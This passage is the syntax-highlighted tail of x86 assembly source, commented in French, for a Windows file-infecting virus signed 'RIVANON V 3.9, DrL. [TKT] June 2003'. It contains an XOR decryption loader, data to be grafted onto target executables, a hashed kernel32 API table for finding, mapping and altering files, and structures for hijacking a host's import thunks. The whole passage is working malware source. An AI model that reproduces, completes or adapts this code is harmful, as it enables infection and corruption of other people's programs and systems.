</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">TAILLE_VIRUS</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0beh</span><span class="sc0">     </span><span class="sc1">;mov esi,adr</span><span class="sc0">
</span><span class="sc5">adr_fin_derniere_sect_hote</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">crypt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">octet_suivant_a_decrypter</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc0">      </span><span class="sc1">;xor al,value</span><span class="sc0">
</span><span class="sc5">clef</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">octet_suivant_a_decrypter</span><span class="sc0">
</span><span class="sc5">exit_loader</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">TAILLE_LOADER</span><span class="sc4">=</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">debut_loader</span><span class="sc0">

</span><span class="sc1">;[Fin du code du loader]</span><span class="sc0">

</span><span class="sc1">;zone de donnees qui vont etre greffees au programme cible:</span><span class="sc0">

</span><span class="sc5">seed</span><span class="sc0">                        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">1fac3b9dh</span><span class="sc0">
</span><span class="sc5">nbre_fct_k32_cible</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">adr_image_base</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">ADR_BASE</span><span class="sc0">
</span><span class="sc5">adr_1st_thunk_avant_infection_hote</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">vrai_ID_FirstThunk_k32</span><span class="sc0">
</span><span class="sc5">rva_orig_1st_thunk_avant_infection_hote</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">RVA</span><span class="sc0"> </span><span class="sc5">vrai_ID_OriginalFirstThunk_k32</span><span class="sc0">
</span><span class="sc5">index_fct_k32_altere_hote</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sz_nom_fct_k32_altere_hote</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ExitProcess'</span><span class="sc0">
</span><span class="sc5">rb</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc0">
</span><span class="sc5">sz_nom_globalalloc</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GlobalAlloc'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">signature</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RIVANON'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'V 3.9, DrL. [TKT] June 2003'</span><span class="sc0">


</span><span class="sc1">;Les deux tables qui suivent doivent etre collees l'une a l'autre et l'ordre des elements</span><span class="sc0">
</span><span class="sc1">;de ces tables respecte.</span><span class="sc0">

</span><span class="sc5">tab_condense</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0fdbe9ddfh</span><span class="sc0">       </span><span class="sc1">;CloseHandle</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">04b00fba1h</span><span class="sc0">       </span><span class="sc1">;CreateFileA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00d6ea22eh</span><span class="sc0">       </span><span class="sc1">;CreateFileMappingA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0abfd70b5h</span><span class="sc0">       </span><span class="sc1">;CreateMutexA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0be307c51h</span><span class="sc0">       </span><span class="sc1">;CreateThread</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0be7b8631h</span><span class="sc0">       </span><span class="sc1">;FindClose</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0c915738fh</span><span class="sc0">       </span><span class="sc1">;FindFirstFileA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">08851f43dh</span><span class="sc0">       </span><span class="sc1">;FindNextFileA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">09c3a5210h</span><span class="sc0">       </span><span class="sc1">;GetDriveTypeA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">091c21cb7h</span><span class="sc0">       </span><span class="sc1">;GetLastError</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">040bf2f84h</span><span class="sc0">       </span><span class="sc1">;GetProcAddress</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">032beddc3h</span><span class="sc0">       </span><span class="sc1">;MapViewOfFile</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">08e0e5487h</span><span class="sc0">       </span><span class="sc1">;SetCurrentDirectoryA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0bc738ae6h</span><span class="sc0">       </span><span class="sc1">;SetEndOfFile</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">050665047h</span><span class="sc0">       </span><span class="sc1">;SetFileAttributesA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">06d452a3ah</span><span class="sc0">       </span><span class="sc1">;SetFilePointer</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">09f69de76h</span><span class="sc0">       </span><span class="sc1">;SetFileTime</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">03a00e23bh</span><span class="sc0">       </span><span class="sc1">;Sleep</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0fae00d65h</span><span class="sc0">       </span><span class="sc1">;UnmapViewOfFile</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0065f101ah</span><span class="sc0">       </span><span class="sc1">;VirtualProtect</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">04e5de044h</span><span class="sc0">       </span><span class="sc1">;ExitThread</span><span class="sc0">

</span><span class="sc5">NBRE_FCT_K32_VIRUS</span><span class="sc4">=(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">tab_condense</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">TAILLE_VIRUS</span><span class="sc4">=</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">debut_virus</span><span class="sc0">

</span><span class="sc5">TAILLE_VIRUS_ALIGNE_FICHIER</span><span class="sc4">=</span><span class="sc5">ALIGNEMENT_FICHIER_STANDARD</span><span class="sc4">*((</span><span class="sc5">TAILLE_VIRUS</span><span class="sc4">+\
</span><span class="sc5">ALIGNEMENT_FICHIER_STANDARD</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)/</span><span class="sc5">ALIGNEMENT_FICHIER_STANDARD</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">TAILLE_VIRUS_ALIGNE_MEMOIRE</span><span class="sc4">=</span><span class="sc5">ALIGNEMENT_MEMOIRE_STANDARD</span><span class="sc4">*((</span><span class="sc5">TAILLE_VIRUS</span><span class="sc4">+\
</span><span class="sc5">ALIGNEMENT_MEMOIRE_STANDARD</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)/</span><span class="sc5">ALIGNEMENT_MEMOIRE_STANDARD</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc1">;[Fin du virus]</span><span class="sc0">

</span><span class="sc5">tab_adr_fct_k32_virus</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">CloseHandle</span><span class="sc0">                             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CreateFileA</span><span class="sc0">                             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CreateFileMappingA</span><span class="sc0">                          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CreateMutexA</span><span class="sc0">                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CreateThread</span><span class="sc0">                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindClose</span><span class="sc0">                               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindFirstFileA</span><span class="sc0">                              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindNextFileA</span><span class="sc0">                               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetDriveTypeA</span><span class="sc0">                               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetLastError</span><span class="sc0">                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetProcAddress</span><span class="sc0">                              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MapViewOfFile</span><span class="sc0">                               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">                            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetEndOfFile</span><span class="sc0">                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetFileAttributesA</span><span class="sc0">                          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetFilePointer</span><span class="sc0">                              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetFileTime</span><span class="sc0">                             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Sleep</span><span class="sc0">                                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">UnmapViewOfFile</span><span class="sc0">                             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">VirtualProtect</span><span class="sc0">                              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ExitThread</span><span class="sc0">                              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">condense</span><span class="sc0">                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">adr_map_IMAGE_OPTIONAL_HEADER_cible</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">adr_map_IMAGE_SECTION_HEADER_cible</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">adr_map_IMAGE_FILE_HEADER_cible</span><span class="sc0">                     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">adr_map_IMAGE_IMPORT_DESCRIPTOR_cible</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">rva_IMAGE_IMPORT_DESCRIPTOR_cible</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">rva_IMAGE_IMPORT_BY_NAME_cible</span><span class="sc0">                      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">adr_map_cible</span><span class="sc0">                               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">thread_id</span><span class="sc0">                               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">tampon</span><span class="sc0">                                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">handle_fichier_cible</span><span class="sc0">                            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">handle_map_cible</span><span class="sc0">                            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">handle_mutex</span><span class="sc0">                                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">nbre_octet_libre_sect_code_cible</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">adr_map_espace_libre_sect_data_cible</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">adr_map_espace_libre_sect_code_cible</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">adr_map_1st_thunk_k32_cible</span><span class="sc0">                     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">adr_map_original_1st_thunk_k32_cible</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">adr_map_loader_sect_code_cible</span><span class="sc0">                      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">struct_recherche</span><span class="sc0">    </span><span class="sc5">rb</span><span class="sc0"> </span><span class="sc5">sizeof.WIN32_FIND_DATA</span><span class="sc0">
</span><span class="sc5">tampon_registre</span><span class="sc0">     </span><span class="sc5">rd</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">tab_adr_fct_k32_hote</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">rd</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">        </span><span class="sc1">;pour la generation 0</span><span class="sc0">









</span><span class="sc9">section</span><span class="sc0"> </span><span class="sc12">'idata'</span><span class="sc0"> </span><span class="sc9">import</span><span class="sc0"> </span><span class="sc5">data</span><span class="sc0"> </span><span class="sc5">readable</span><span class="sc0"> </span><span class="sc5">writeable</span><span class="sc0">

</span><span class="sc1">;IMAGE_IMPORT_DESCRIPTOR:</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">RVA</span><span class="sc0"> </span><span class="sc5">ID_OriginalFirstThunk_k32</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">RVA</span><span class="sc0"> </span><span class="sc5">ID_Name_k32</span><span class="sc4">,</span><span class="sc5">RVA</span><span class="sc0"> </span><span class="sc5">ID_FirstThunk_k32</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">RVA</span><span class="sc0"> </span><span class="sc5">ID_OriginalFirstThunk_u32</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">RVA</span><span class="sc0"> </span><span class="sc5">ID_Name_u32</span><span class="sc4">,</span><span class="sc5">RVA</span><span class="sc0"> </span><span class="sc5">ID_FirstThunk_u32</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ID_Name_k32</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'KERNEL32.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ID_Name_u32</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'USER32.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ID_OriginalFirstThunk_k32</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">RVA</span><span class="sc0"> </span><span class="sc5">image_import_by_name_k32_00</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ID_FirstThunk_k32</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ExitProcess</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">RVA</span><span class="sc0"> </span><span class="sc5">image_import_by_name_k32_00</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">ID_OriginalFirstThunk_u32</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">RVA</span><span class="sc0"> </span><span class="sc5">image_import_by_name_u32</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ID_FirstThunk_u32</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">MessageBoxA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">RVA</span><span class="sc0"> </span><span class="sc5">image_import_by_name_u32</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;IMAGE_IMPORT_BY_NAME:</span><span class="sc0">
</span><span class="sc5">image_import_by_name_k32_00</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ExitProcess'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">image_import_by_name_k32_01</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Sleep'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">image_import_by_name_u32</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MessageBoxA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">





</span><span class="sc5">vrai_ID_OriginalFirstThunk_k32</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">RVA</span><span class="sc0"> </span><span class="sc5">image_import_by_name_k32_00</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">RVA</span><span class="sc0"> </span><span class="sc5">image_import_by_name_k32_01</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vrai_ID_FirstThunk_k32</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">faux_ExitProcess</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">__ExitProcess</span><span class="sc0">
</span><span class="sc5">faux_Sleep</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">__Sleep</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span></div></body>
</html>
